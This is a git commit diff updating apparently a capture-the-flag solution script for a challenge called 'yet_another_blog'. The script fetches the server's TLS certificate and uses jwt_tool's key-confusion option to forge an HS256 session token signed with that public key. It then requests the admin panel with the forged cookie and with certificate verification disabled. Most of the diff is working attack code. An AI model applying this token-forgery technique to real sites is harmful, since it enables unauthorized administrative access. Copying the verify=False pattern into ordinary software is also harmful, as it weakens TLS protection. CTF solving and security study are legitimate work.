b228afe5713d3984b32e098ed28c0984084d6b0e
Aljaz Medic <aljaz.medic@gmail.com>
2023-04-13 23:08:33 +0200

    Update sol script

--- challs/yet_another_blog/sol.py
+++ challs/yet_another_blog/sol.py
@@ -6,12 +6,14 @@ import base64
 import json
 
 
-url = "https://localhost:443"
+domain = "blog.dctf.si"
+url = f"https://{domain}:443"
 
 def get_pubkey(out_file):
-    os.system(f"timeout 2s openssl s_client -connect chall.aljaz.si:443 2>/dev/null | openssl x509 > {out_file}")
+    os.system(f"timeout 6s openssl s_client -connect {domain}:443 2>/dev/null | openssl x509 > {out_file}")
+    pass
 
-pk_file = "./sol.pk.pem" # You get this from the ssl cert
+pk_file = f"./{domain}.cert.pem" # You get this from the ssl cert
 get_pubkey(pk_file)
 jwt_tool_dir = "/opt/jwt_tool"
 
@@ -33,7 +35,7 @@ token = f"{header}.{payload}.Oetm7xvhkYbiItRiqNx-z7LZ6ZkmDe1z_95igbPUSjA"
 
 argv = [f"{jwt_tool_dir}/jwt_tool.py",
         "-pk", pk_file,
-        "-X", "k",  # Confision attack
+        "-X", "k",  # Confusion attack
         "-np",  # Don't use proxy
         "-S", "hs256",
         "-b",  # raw output
@@ -43,7 +45,7 @@ print(*argv)
 p = subprocess.Popen(argv, stdout=subprocess.PIPE)
 generated = p.communicate()[0].decode("utf-8").strip()
 print(generated)
-r = requests.get(f"{url}/admin_panel", cookies={"session": generated})
+r = requests.get(f"{url}/admin_panel", cookies={"session": generated}, verify=False)
 print(r)
 print(r.history)
 print(r.text)
